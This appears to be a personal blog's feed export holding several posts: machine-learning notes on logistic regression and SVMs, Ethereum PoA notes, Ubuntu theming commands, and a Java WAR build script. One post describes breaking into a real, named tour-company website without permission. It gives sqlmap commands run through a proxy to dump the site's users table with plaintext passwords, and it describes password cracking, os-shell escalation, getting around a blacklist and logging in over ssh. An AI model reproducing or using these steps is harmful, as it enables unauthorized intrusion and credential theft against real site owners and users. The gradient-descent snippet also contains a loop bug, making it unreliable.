{w}}=\frac{1}{m}\sum\limits_{i=1}^{m}{(h_w(x_i)-{y_i})x_i}$$<br>代码例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gradient descent</span></span><br><span class="line">x = data <span class="comment"># feature array,default(n,m), gradient dimension is m</span></span><br><span class="line">y = label <span class="comment"># result/ ground truth</span></span><br><span class="line">w = np.zeros(x.shape[<span class="number">1</span>])</span><br><span class="line">iter_num = <span class="number">1000</span></span><br><span class="line">lr = <span class="number">1e-4</span></span><br><span class="line"><span class="keyword">for</span> one_iter <span class="keyword">in</span> range(iter_num):</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> len(data):</span><br><span class="line"><span class="comment"># 下面xiyi赋值是看着方便，实际上用的时候直接用index取list元素</span></span><br><span class="line">x_i = data[index]</span><br><span class="line">y_i = label[index]</span><br><span class="line"><span class="comment"># 用上面的公式，求partial</span></span><br><span class="line">gradient = x_i*(<span class="number">1</span>/(<span class="number">1</span>+np.exp(np.dot(w,x_i)))-y_i)</span><br><span class="line">w+=gradient*lr</span><br><span class="line">print(<span class="string">"final w:"</span>,w)</span><br></pre></td></tr></table></figure><h2 id="最大熵模型-Max-Entropy-Model"><a href="#最大熵模型-Max-Entropy-Model" class="headerlink" title="最大熵模型 Max Entropy Model"></a>最大熵模型 Max Entropy Model</h2><p><del>复杂度超高，做分类慢的一批</del>，一般用来衡量预测效果的好坏，<del>其实一般也不用</del>。主要是记录一下最大熵模型的思想：将分类等问题作为约束最优化问题，下面的SVM和Adaboost等算法都是采用的约束最优化思想完成的。</p><h2 id="支持向量机-Support-Vector-Machines"><a href="#支持向量机-Support-Vector-Machines" class="headerlink" title="支持向量机 Support Vector Machines"></a>支持向量机 Support Vector Machines</h2><p>间隔最大化的学习策略，可形式化为求解<strong>凸二次规划</strong>问题/正则化的合页损失函数的最小化问题<br>训练数据线性可分，通过硬间隔最大化（hard margin maximization）学习<em>线性可分SVM/硬间隔SVM</em><br>数据近似线性可分，通过软间隔最大化（soft margin maximization）学习<em>线性SVM/软间隔SVM</em><br>数据线性不可分时，通过核函数+软间隔最大化，学习<em>非线性SVM</em>：核函数表示将输入从输入空间映射到特征空间得到的特征向量的内积(点乘)，可以抽象成在高维空间里学习一个线性SVM</p><h3 id="线性SVM"><a href="#线性SVM" class="headerlink" title="线性SVM"></a>线性SVM</h3><p>函数间隔、约束最优化问题</p><ul><li>函数间隔：对于给定数据和超平面wx+b：<br>关于样本点(x,y)的函数间隔为$\gamma_f=y(wx+b)$<br>关于数据集的函数间隔为，所有样本点的最小值，$\gamma_{min}=min(\gamma_f)$</li><li>几何间隔：归一化函数间隔，在法向量正向的几何间隔为$\gamma_g=y(\frac{w}{||w||}\cdot{x}+\frac{b}{||w||}),其中||w||是法向量w的L_2范数$<br>两者关系是$\gamma_f=\gamma_g*||w||$</li><li>间隔最大化，我们为使SVM分类样本点的置信度更大，需要将超平面关于数据集的几何间隔最大化，即求<em>最大几何间隔的超平面</em>，数学描述为：<br>$$max\ \frac{\gamma_f}{||w||}\\ s.t.\ y(wx+b)\geq \gamma_{min}$$<br>由于等式两边在尺度上是一致的，用一下无敌的“不妨设”$\gamma_f = 1$，那么优化目标为w的L2范数的最小值，即<br>$$max\ \frac{\gamma_f}{||w||}等价于求\min{\frac{||w||^2}{2}}\\ s.t.\ y(wx+b)\geq{1}$$<br>那么这个转化为二次规划的非线性规划如何求解呢？<br>使用<strong>拉格朗日对偶性</strong>求解对偶问题得到以上问题的解，以这个线性可分问题为例，引入N个拉格朗日乘子，$\alpha$，对应N维特征和N维法向量w：<br>$$构建拉格朗日函数L(w,b,\alpha)=\frac{||w||^2}{2}-\sum\limits_{i=1}^N{\alpha_iy_i(wx_i+b)}+\sum\limits_{i=1}^N{\alpha_i}$$<br>原始问题的对偶问题转化为$\max\limits_{\alpha}\min\limits_{w,b}L,下面推导一下$<br>Derivatives:<br>$$\frac{\partial{L(w,b,\alpha)}}{\partial{w}}=w-\sum\limits_{i=1}^N{\alpha_ix_iy_i}=0\\ \frac{\partial{L(w,b,\alpha)}}{\partial{b}}=\sum\limits_{i=1}^N{\alpha_iy_i}=0$$<br>Then we turn to:<br>$$max:L(w,b,\alpha)=\sum\limits_{i=1}^N{\alpha_i}-\frac{1}{2}\sum\limits_{i,j=1}^N{y_iy_j\alpha_i\alpha_jx_i^Tx_j}\\ s.t\ \sum\limits_{i=1}^N{\alpha_iy_i}=0$$</li></ul><p>这化简为只有拉格朗日乘子alpha的L极大值问题了，到这一步，我们可以直接进行SMO求解（从这里可以直接跳到下一节）<br>于是我们可以引入软间隔的线性SVM，对每个样本点引进一个松弛变量$\xi\geq0$，再引进一个惩罚参数C，那么我们的问题由$求min\frac{||w||^2}{2}转化为min(\frac{||w||^2}{2}+C\sum\limits_{i=1}^N{\xi_i})$<br>$$L(w,b,\xi,\alpha,\mu)=\frac{||w||^2}{2}+C\sum\limits_{i=1}^N{\xi_i}-\sum\limits_{i=1}^N{\alpha_iy_i(wx_i+b)}+\sum\limits_{i=1}^N{\alpha_i(1-\xi_i)}-\sum\limits_{i=1}^N{\mu_i\xi_i},\\<br>s.t.\ y(wx+b)\geq1-\xi,\xi\geq0$$<br>Derivatives:<br>$$\frac{\partial{L}}{\partial{w}}=w-\sum\limits_{i=1}^N{\alpha_ix_iy_i}=0\\<br>\frac{\partial{L}}{\partial{b}}=-\sum\limits_{i=1}^N{\alpha_iy_i}=0\\<br>\frac{\partial{L}}{\partial{\xi_i}}=C-\alpha_i-\mu_i=0$$<br>以上求出关于$w,b,\xi$的极小后<br>turn to :<br>$$max:L(w,b,\xi,\alpha,\mu)=\sum\limits_{i=1}^N{\alpha_i}-\frac{1}{2}\sum\limits_{i,j=1}^N{y_iy_j\alpha_i\alpha_jx_i^Tx_j}\\<br>s.t.\ \sum\limits_{i=1}^N{\alpha_iy_i}=0,\\<br>C-\alpha_i-\mu_i=0$$<br>由以上结果可以看出，如果将目标函数的max转化为求min(改正负号)，均得到对应的对偶问题，其满足KKT条件，经过求解对偶问题，得出alpha，带入解得w和b，$$w=\sum\limits_{i=1}^N{\alpha_ix_iy_i}\\<br>b=y_j-\sum\limits_{i=1}^N{}y_i\alpha_i(x_ix_j)$$即得到超平面，<strong>wx+b=0</strong><br>以上两种线性的SVM可以直接由上面的推导将一个求最大间隔的原始问题转化为求一个超平面的对偶问题，进而求得</p><h3 id="非线性SVM"><a href="#非线性SVM" class="headerlink" title="非线性SVM"></a>非线性SVM</h3><p>核函数用来将两个样本点实例$x,z$通过映射函数$\Phi(x),\Phi(z)$从输入空间映射到特征空间内，核函数表示为K，即$K(x,z)=\Phi(x)^T\Phi(z)$，一般不写出映射函数$\Phi$，而是在Kernel函数中隐式给出：<br>在这记录一下高斯核Gaussian kernel(radial basis function,RBF kernel):<br>$$K(x,z)=exp(-\frac{||x-z||^2}{2\sigma^2})$$和sigmoid核：<br>$$K(x,z)=tanh(ax^Tz+c)\\ tanh(b)=\frac{1-e^{-2b}}{1+e^{-2b}}$$<br>“SVM with a sigmoid kernel is equivalent to a 2-layer perceptron”，一个结论，显式的证明就不用写了，其实在看到拉格朗日乘子alpha时，我们就可以直观的联想到拉格朗日乘子相当于感知机场景下对feature的权重。</p><h3 id="序列最小最优化算法，sequential-minimal-optimization-SMO-alg"><a href="#序列最小最优化算法，sequential-minimal-optimization-SMO-alg" class="headerlink" title="序列最小最优化算法，sequential minimal optimization,SMO alg."></a>序列最小最优化算法，sequential minimal optimization,SMO alg.</h3><p>引入核函数的非线性转化为线性（甚至是可分）的凸二次规划问题：<br>$$\min\limits_{\alpha}:\frac{1}{2}\sum\limits_{i,j=1}^N{y_iy_j\alpha_i\alpha_jx_i^Tx_j}-\sum\limits_{i=1}^N{\alpha_i},\\<br>s.t.\ \sum\limits_{i=1}^N{\alpha_iy_i}=0$$<br>非线性引入Gaussian核的SVM实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def SVM():</span><br></pre></td></tr></table></figure><h3 id="概念补充"><a href="#概念补充" class="headerlink" title="概念补充"></a>概念补充</h3><p><em>supprot vector</em>:线性不可分情况下，对偶问题的解$\alpha=(a_1,a_2…a_N)^T中a_i对应的样本点(x_i,y_i)就是支持向量。$<br><em>凸优化问题</em>：设$f:F\rightarrow{R}为$凸函数，则求$\min\limits_{x\in{F}}{f(x)}为$凸优化问题<br>凸优化有如下几个定理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">凸优化任意局部最优解即全局最优解</span><br><span class="line">凸优化最优解集为凸集</span><br><span class="line">若函数f为非空凸集上的严格凸函数，且凸优化问题存在全局最优解，那么全局最优解唯一</span><br></pre></td></tr></table></figure><p>在条件$f_i(x)\leq0,1,a_i^T\cdot x = b_i$最小化$f_0(x)$，<br>凸集指一个集合空间内部两点间连线所覆盖的点都在集合空间内，<br>凸二次规划（convex quadratic programming）指目标函数为凸二次函数，形如<br>$$min f(x)= \frac{1}{2}x^TQx+C^Tx,\\<br>s.t.\ Ax\leq{b}，其每一行对应一个约束$$<br><em>Karush-Kuhn-Tucker condition:</em><br>$\alpha_i\geq{0}\\<br>y_i(wx_i+b)\geq{1}\\<br>\alpha_i(y_i(w_ix+b)-1)=0$</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;该笔记是对李航统计学习方法和All of Statics做的学习笔记，简单进行相关算法实验，加强理解，查缺补漏等，内容尽量精炼&lt;/p&gt;
    
    </summary>
    
      <category term="数学" scheme="http://waynamigo.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    
      <category term="ML" scheme="http://waynamigo.github.io/tags/ML/"/>
    
      <category term="数学" scheme="http://waynamigo.github.io/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Solidity编写smart contract的demo</title>
    <link href="http://waynamigo.github.io/2019/07/22/2019-07-22-blockchain/"/>
    <id>http://waynamigo.github.io/2019/07/22/2019-07-22-blockchain/</id>
    <published>2019-07-21T16:00:00.000Z</published>
    <updated>2021-07-20T01:57:41.447Z</updated>
    
    <content type="html"><![CDATA[<p>暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)<br>ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是<a href="http://talk.strangeai.pro" target="_blank" rel="noopener">http://talk.strangeai.pro</a><br>（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾）</p><a id="more"></a><p><a href="http://ethdoc.cn/" target="_blank" rel="noopener">eth文档</a><br><a href="https://solidity-cn.readthedocs.io" target="_blank" rel="noopener">solidity文档</a></p><h2 id="测试网络Rinkeby"><a href="#测试网络Rinkeby" class="headerlink" title="测试网络Rinkeby"></a>测试网络Rinkeby</h2><p>Rinkeby是以太坊官方提供的测试网络，使用PoA共识机制<br>PoA流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">创世块中指定一组初始授权的signers,所有地址保存在创世区块(Genesis Block),并且把该区块的hash写到钱包里。</span><br><span class="line"></span><br><span class="line">启动挖矿后, 该组signers开始对生成的block进行签名并广播</span><br><span class="line"></span><br><span class="line">签名结果保存在区块头的Extra字段中</span><br><span class="line"></span><br><span class="line">Extra中更新当前高度已授权的所有signers的地址,因为有新加入或踢出的signer</span><br><span class="line"></span><br><span class="line">每一高度都有一个signer处于IN-TURN状态, 其他signer处于OUT-OF-TURN状态, IN-TURN的signer签名的block会立即广播, OUT-OF-TURN的signer签名的block会延时一段时间后再广播, 保证IN-TURN的签名block有更高的优先级上链</span><br><span class="line"></span><br><span class="line">如果需要加入一个新的signer,signer通过API接口发起一个proposal, 该proposal通过复用区块头 Coinbase(新signer地址)和Nonce(&quot;0xffffffffffffffff&quot;) 字段广播给其他节点. 所有已授权的signers对该新的signer进行&quot;加入&quot;投票, 如果赞成票超过signers总数的50%, 表示同意加入</span><br><span class="line"></span><br><span class="line">如果需要踢出一个旧的signer, 所有已授权的signers对该旧的signer进行&quot;踢出&quot;投票, 如果赞成票超过signers总数的50%, 表示同意踢出</span><br></pre></td></tr></table></figure><h2 id="Solidity"><a href="#Solidity" class="headerlink" title="Solidity"></a>Solidity</h2><p>code<br>请稍等</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)&lt;br&gt;ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是&lt;a href=&quot;http://talk.strangeai.pro&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://talk.strangeai.pro&lt;/a&gt;&lt;br&gt;（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾）&lt;/p&gt;
    
    </summary>
    
      <category term="Solidity" scheme="http://waynamigo.github.io/categories/Solidity/"/>
    
    
      <category term="paper" scheme="http://waynamigo.github.io/tags/paper/"/>
    
      <category term="ML" scheme="http://waynamigo.github.io/tags/ML/"/>
    
      <category term="blockchain" scheme="http://waynamigo.github.io/tags/blockchain/"/>
    
      <category term="Solidity" scheme="http://waynamigo.github.io/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap注入拿后台</title>
    <link href="http://waynamigo.github.io/2019/07/15/2019-07-15-sqlmap-1/"/>
    <id>http://waynamigo.github.io/2019/07/15/2019-07-15-sqlmap-1/</id>
    <published>2019-07-14T16:00:00.000Z</published>
    <updated>2021-07-20T01:56:56.217Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文过程中无破坏性操作</strong><br>对于这种php的无防站，直接用sqlmap+msf就可以拿。<br>对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。<br>2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录</p><a id="more"></a><h2 id="先找后台（这位老哥直接在右上角放了链接）"><a href="#先找后台（这位老哥直接在右上角放了链接）" class="headerlink" title="先找后台（这位老哥直接在右上角放了链接）"></a>先找后台（这位老哥直接在右上角放了链接）</h2><p><a href="http://hesselgravetours.com/event.php?tourID=1721" target="_blank" rel="noopener">http://hesselgravetours.com/event.php?tourID=1721</a></p><ul><li>check databases<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 --dbs --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check tables<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave --tables --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check columns<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users --columns --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>dump <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users -C username,userID,password,accesslevel --dump --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可见没经过加密。。<br>如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如<a href="https://www.cmd5.com/）" target="_blank" rel="noopener">https://www.cmd5.com/）</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-5.JPG" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="后续不贴了。"><a href="#后续不贴了。" class="headerlink" title="后续不贴了。"></a>后续不贴了。</h2><p><strong>防御太低有好几种方法找到路进行提权</strong></p><ul><li>因为在前面已经得到系统是FreeBSD或者是其他linux，并且得到网站运行在的用户名是content，懂我意思吧</li><li>继续用sqlmap –os-shell提权，第一次没有找到上传点</li><li>后台找到这个admin/documents/clients_recordview.php</li></ul><h2 id="插-入-服-务-器"><a href="#插-入-服-务-器" class="headerlink" title="插 入 服 务 器"></a>插 入 服 务 器</h2><p>提示是：<br>ssh -o HostKeyAlgorithms=+ssh-dss <a href="mailto:content@hesselgravetours.com" target="_blank" rel="noopener">content@hesselgravetours.com</a></p><p>密码是<del><strong><strong>***</strong></strong></del><br>图片不贴了</p><h4 id="明天读一下"><a href="#明天读一下" class="headerlink" title="明天读一下"></a>明天读一下</h4><p><a href="https://arxiv.org/pdf/1502.01852.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1502.01852.pdf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文过程中无破坏性操作&lt;/strong&gt;&lt;br&gt;对于这种php的无防站，直接用sqlmap+msf就可以拿。&lt;br&gt;对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。&lt;br&gt;2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录&lt;/p&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://waynamigo.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Linux" scheme="http://waynamigo.github.io/tags/Linux/"/>
    
      <category term="web" scheme="http://waynamigo.github.io/tags/web/"/>
    
      <category term="sqlmap" scheme="http://waynamigo.github.io/tags/sqlmap/"/>
    
      <category term="msf" scheme="http://waynamigo.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>部分MACOS风格的ubuntu</title>
    <link href="http://waynamigo.github.io/2019/07/09/2019-07-09-%E6%88%91%E7%9A%84ubuntu%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E9%A3%8E%E6%A0%BC/"/>
    <id>http://waynamigo.github.io/2019/07/09/2019-07-09-我的ubuntu设置界面风格/</id>
    <published>2019-07-08T16:00:00.000Z</published>
    <updated>2021-07-20T01:56:15.575Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下以防以后电脑崩了还得重新配,感觉撑不住了</p><a id="more"></a><h3 id="效果这样"><a href="#效果这样" class="headerlink" title="效果这样"></a>效果这样</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/screenshot.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-tweak-tool</span><br><span class="line">#extensions.gnome.org install [ User themes]</span><br><span class="line"> </span><br><span class="line">#www.gnome-look.org [ gtk-3 themes:McOS-HS]</span><br><span class="line">tar -zxvf McOS-HS-2-themes.tar.gz</span><br><span class="line">#go to tweaks and chose this theme</span><br><span class="line"></span><br><span class="line">tar -zxvf macOS11.tar.xz </span><br><span class="line">#extensions.gnome.org [dash-to-dock]</span><br><span class="line">#www.gnome-look.org [OSX.for.Dash.to.DOCK]</span><br><span class="line">#www.gnome-look.org [Icon Themes: macOS icons]</span><br><span class="line"># extensioons.gnome.org [blyr]</span><br></pre></td></tr></table></figure><p>go to tweaks and choose them</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/tweaks.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>cd ./OSX.for.Dash.to.DOCK/Dock Settings/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock show-apps-at-top true</span><br><span class="line"></span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-running-dots false</span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-customize-running-dots false</span><br><span class="line"></span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-shrink false</span><br><span class="line"></span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock transparency-mode DEFAULT</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#www.gnome-look.org [GDM themes:SetAsWallpaper]</span></span><br><span class="line"></span><br><span class="line">mv ubuntu.css /usr/share/gnome-shell/theme/</span><br><span class="line"></span><br><span class="line">sudo mv /usr/share/gnome-shell/extensions/ubuntu-dock@ubuntu.com ~/</span><br></pre></td></tr></table></figure><h3 id="upgrade后锁屏界面恢复的问题"><a href="#upgrade后锁屏界面恢复的问题" class="headerlink" title="upgrade后锁屏界面恢复的问题"></a>upgrade后锁屏界面恢复的问题</h3><p>SetAsWallpaper里的ubuntu.css 更改到/usr/share/gnome-shell/theme/下，并把壁纸更换就ok了，因为upgrade的时候会更新gnome，theme会重新从源下载覆盖</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下以防以后电脑崩了还得重新配,感觉撑不住了&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://waynamigo.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://waynamigo.github.io/tags/Linux/"/>
    
      <category term="tweak" scheme="http://waynamigo.github.io/tags/tweak/"/>
    
  </entry>
  
  <entry>
    <title>用了个bash手动打包java项目并在tomcat中运行</title>
    <link href="http://waynamigo.github.io/2019/07/03/2019-07-03-%E7%BB%8F%E7%AE%A1%E5%90%8C%E5%AD%A6%E7%9A%84tomcat%E9%A1%B9%E7%9B%AE/"/>
    <id>http://waynamigo.github.io/2019/07/03/2019-07-03-经管同学的tomcat项目/</id>
    <published>2019-07-02T16:00:00.000Z</published>
    <updated>2019-07-25T06:55:36.544Z</updated>
    
    <content type="html"><![CDATA[<p>觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)<br>帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下。（佛了，为什么不用maven</p><a id="more"></a><h2 id="jdbc和tomcat和手写的DAO，怀旧。"><a href="#jdbc和tomcat和手写的DAO，怀旧。" class="headerlink" title="jdbc和tomcat和手写的DAO，怀旧。"></a>jdbc和tomcat和手写的DAO，怀旧。</h2><p>用idea打包：</p><p>先是在idea里面配置的Webapplication的archive，里面要选一个WEB-INF和META-INF。</p><p>将avaliavle elements进行put into outputroot操作，左边的out layout栏里，出现META-INF<br>build project 再 build artifacts</p><p>好了<br>但是报错了，不知道为啥，war包导出来了，tomcat运行出错。。nmd</p><p>项目结构这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">├── bin</span><br><span class="line">│   └── out.jar</span><br><span class="line">├── build</span><br><span class="line">│   └── source.txt</span><br><span class="line">├── build.sh</span><br><span class="line">├── classdesign.war</span><br><span class="line">├── out</span><br><span class="line">│   ├── artifacts</span><br><span class="line">│   └── production</span><br><span class="line">├── src</span><br><span class="line">│   ├── com</span><br><span class="line">│   └── MANIFEST.MF</span><br><span class="line">└── web</span><br><span class="line">    ├── commom</span><br><span class="line">    ├── css</span><br><span class="line">    ├── iconfont</span><br><span class="line">    ├── images</span><br><span class="line">    ├── js</span><br><span class="line">    └── WEB-INF</span><br></pre></td></tr></table></figure><h3 id="然后手动打包了，（写了个循环shellfor-javac）"><a href="#然后手动打包了，（写了个循环shellfor-javac）" class="headerlink" title="然后手动打包了，（写了个循环shellfor javac）"></a>然后手动打包了，（写了个循环shellfor javac）</h3><p><a href="https://github.com/waynamigo/templates/blob/master/bashs/build.sh" target="_blank" rel="noopener">代码在这</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#写到source，做个list，或者直接用idea生成source.txt也可以</span></span><br><span class="line">path=$(<span class="built_in">pwd</span>)</span><br><span class="line"><span class="function"><span class="title">dependence</span></span>()&#123;</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> `ls <span class="variable">$1</span>|grep -v <span class="string">".bak"</span>`</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ -d <span class="variable">$1</span><span class="string">"/"</span><span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      dependence <span class="variable">$1</span><span class="string">"/"</span><span class="variable">$file</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">local</span> file_path=<span class="variable">$1</span><span class="string">"/"</span><span class="variable">$file</span> </span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">echo</span> <span class="variable">$file_path</span>|grep <span class="string">"MANIFEST.MF"</span>&gt;/dev/null;<span class="keyword">then</span></span><br><span class="line">      c=c</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="variable">$file_path</span> &gt;&gt; <span class="variable">$path</span>/build/<span class="built_in">source</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependence <span class="variable">$path</span>/src</span><br><span class="line">libs=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> java_lib <span class="keyword">in</span> $(ls <span class="variable">$path</span>/web/WEB-INF/lib);<span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [[ libs != <span class="string">""</span> ]];<span class="keyword">then</span></span><br><span class="line">libs=<span class="variable">$libs</span>:<span class="variable">$path</span>/web/WEB-INF/lib/<span class="variable">$java_lib</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">libs=<span class="variable">$path</span>/web/WEB-INF/lib/<span class="variable">$java_lib</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">javac -encoding utf-8 -Xlint:unchecked -d <span class="variable">$path</span>/build -classpath <span class="variable">$path</span>/web/WEB-INF/lib @<span class="variable">$path</span>/build/<span class="built_in">source</span></span><br><span class="line">jar cvf  <span class="variable">$path</span>/src/MANIFEST.MF  <span class="variable">$path</span>/bin/classdesign.war ./*</span><br></pre></td></tr></table></figure><h3 id="把war烤到webapps执行startup-sh就可以运行了"><a href="#把war烤到webapps执行startup-sh就可以运行了" class="headerlink" title="把war烤到webapps执行startup.sh就可以运行了"></a>把war烤到webapps执行startup.sh就可以运行了</h3>]]></content>
    
    <summary type="html">
    
